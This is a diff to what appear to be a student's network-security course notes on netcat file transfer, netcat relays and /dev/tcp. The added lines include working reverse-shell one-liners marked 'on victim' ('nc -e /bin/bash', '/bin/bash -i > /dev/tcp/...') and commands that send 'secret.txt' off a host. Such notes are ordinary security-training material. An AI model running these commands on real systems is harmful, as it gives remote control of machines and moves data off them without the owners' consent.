@@ -71,7 +71,7 @@ Syntax
   Download - proxychains scp student@localhost:secretstuff.txt .
   Upload - proxychains scp secretstuff.txt student@localhost:
   
-
+-------------------------------------------------------------
 Netcat can also be used to transfer files
     Can be used for the following:
         inbound and outbound connections, TCP/UDP, to or from any port
@@ -86,6 +86,52 @@ Client (Sends File) - nc 172.16.82.106 9001 < file.txt
 Listener to Client
 Listener (Sends File) - nc -lvp 9001 < file.txt
 Client (Receive File) - nc 172.16.82.106 9001 > newfile.txt
+
+Netcat Relays
+Listener-Listener
+
+Host 1 -The Relay
+mknod mypipe p
+nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+
+Host 2 - Send
+nc 172.16.82.106 1111 < secret.txt
+
+Host 3 - Recieve
+nc 192.168.1.1 3333 > newsecret.txt
+
+Client-Client - Relay connects to the two IP's
+Client-Listener
+
+File Transfer with /Dev/TCP
+Receiving
+nc -lvp 1111 > devtcpfile.txt
+
+Sending
+cat secret.txt > /dev/tcp/10.10.0.40/1111
+-------------------------------------------------------------
+Reverse Shells
+Using netcat
+1. Listen ot shell on your device
+ nc -lvp 9999
+2. On victim using -c
+ nc -c /bin/bash 10.10.0.40 9999
+3. On Victim using -e
+ nc -e /bin/bash 10.10.0.40 9999
+
+Using /Dev/TCP
+1. Same as netcat
+ nc -lvp 9999
+2. On Victim
+ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+-------------------------------------------------------------
+
+
+
+
+
+
+
 
 
 
